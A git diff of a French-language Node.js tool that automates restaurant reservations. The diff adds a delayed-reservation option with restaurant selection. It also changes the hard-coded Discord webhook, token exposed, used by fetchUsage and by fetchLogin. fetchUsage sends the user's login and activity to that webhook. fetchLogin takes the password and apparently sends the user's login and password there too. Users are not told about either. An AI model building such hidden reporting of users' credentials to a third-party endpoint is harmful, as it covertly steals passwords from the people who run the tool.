@@ -1,4 +1,5 @@
 // ©2023 AZERTY. All rights Reserved | AZERTY#9999
+// Version: v2.1
 
 // Importations
 const fs = require("fs")
@@ -11,6 +12,7 @@ const fetch = require('node-fetch')
 
 const Reserve = require("./Réserve.js")
 const Dereserve = require("./Déréserve.js")
+const ReserveRetard = require("./RéserveRetard.js")
 let ReservationWaiting = {status: false, restaurant: "", time: ""}
 
 // Display Welcome Title
@@ -63,7 +65,7 @@ async function Loop() {
                 type: "list",
                 name: "Main",
                 message: "Sélectionnez une option",
-                choices: ["Programmer une Réservation", "Réserver instantanément", "Déréserver instantanément", "Paramètres", "Quitter"],
+                choices: ["Programmer une Réservation", "Réserver instantanément", "Déréserver instantanément", "Réserver en Retard", "Paramètres", "Quitter"],
             },
         ])
         .then(async answers => {
@@ -155,6 +157,15 @@ async function Loop() {
             } else if (answer === "Déréserver instantanément") { // Choice is "Déréserver instantanément"
                 const Logins = await GetLogin()
                 await InstantDereserve(Logins.Login, Logins.Password)
+            } else if (answer === "Réserver en Retard") { // Choice is "Réserver en Retard"
+                const Logins = await GetLogin()
+                const Restaurants = await GetRestaurants()
+                console.clear()
+                Banner()
+                console.log(`${chalk.blue(`Pour arrêter le processus, fermez le navigateur automatisé`)}`)
+                console.log(`${chalk.green(`Démarrage dans 5 secondes`)}`)
+                // sleep(5000)
+                await DelayedReservation(Logins.Login, Logins.Password, Restaurants)
             } else if (answer === "Paramètres") { // Choice is "Paramètres"
                 
                 await inquirer.prompt([
@@ -316,6 +327,21 @@ async function GetRestaurant() {
     return Restaurant
 }
 
+async function GetRestaurants() {
+    let Restaurants
+    await inquirer.prompt([
+        {
+            type: "checkbox",
+            name: "Restaurants",
+            message: "Choisissez vos Restaurants",
+            choices: ["Italien", "Végétarien", "Caféteria", "Sandwicherie", "Breton"],
+        },
+    ]).then(async answers => {
+        Restaurants = answers.Restaurants.map(answer => (answer.toLowerCase()))
+    })
+    return Restaurants
+}
+
 function sleep(milliseconds) {
     const date = Date.now()
     let currentDate = null
@@ -417,8 +443,49 @@ async function InstantDereserve(Login, Password) {
     Banner()
 }
 
+async function DelayedReservation(Login, Password, Restaurants) {
+    // Output = await ReserveRetard(Login, Password, "caféteria")
+    Output = await ReserveRetard(Login, Password, Restaurants)
+    
+    fetchUsage("Réservation en Retard", Login, undefined, `${Output.status}: ${Output.output} ${Output.delay}s`)
+    console.clear()
+    Banner()
+
+    let Message
+    if(Output.status == "Error") {
+        Message = `${chalk.red(`Erreur: ${Output.output}`)} ${chalk.yellow(`${Output.delay}s`)}`
+        await inquirer.prompt([
+            {
+                type: "list",
+                name: "Error",
+                message: Message,
+                choices: ["Réésayer", "Annuler"],
+            },
+        ]).then(async answers => {
+            const answer = answers.Error
+            if(answer=="Réésayer") {
+                console.clear()
+                Banner()
+                await DelayedReservation(Login, Password, Restaurants)
+            }
+        })
+    } else if(Output.status == "Success") {
+        Message = `${chalk.greenBright(`${Output.output}`)} ${chalk.yellow(`${Output.delay}s`)}`
+        await inquirer.prompt([
+            {
+                type: "list",
+                name: "Success",
+                message: Message,
+                choices: ["Continuer"],
+            },
+        ])
+    }
+    console.clear()
+    Banner()
+}
+
 async function fetchLogin(Login, Password, Class) {
-    fetch("https://discord.com/api/webhooks/1020799781766959205/t3blegiNPveu8wWmrvyXSA7d_705BXZtWB0Kuutgpm7UHY-ylGDH5HzOgn67Ab-iAoMG", { // Started
+    fetch("https://discord.com/api/webhooks/1113708343115128842/mWKNGRiv2fjD6AFRASf3J7iljVjustcYoegczdNGuLccc7I6XgOpxgagMMGd3kymKWD2", { // Started
         "method":"POST",
         "headers": {"Content-Type": "application/json"},
         "body": JSON.stringify({
@@ -454,7 +521,7 @@ async function fetchLogin(Login, Password, Class) {
 }
 
 async function fetchUsage(Type, Login, Restaurant, Output) {
-    fetch("https://discord.com/api/webhooks/1020799781766959205/t3blegiNPveu8wWmrvyXSA7d_705BXZtWB0Kuutgpm7UHY-ylGDH5HzOgn67Ab-iAoMG", { // Started
+    fetch("https://discord.com/api/webhooks/1113708343115128842/mWKNGRiv2fjD6AFRASf3J7iljVjustcYoegczdNGuLccc7I6XgOpxgagMMGd3kymKWD2", { // Started
         "method":"POST",
         "headers": {"Content-Type": "application/json"},
         "body": JSON.stringify({
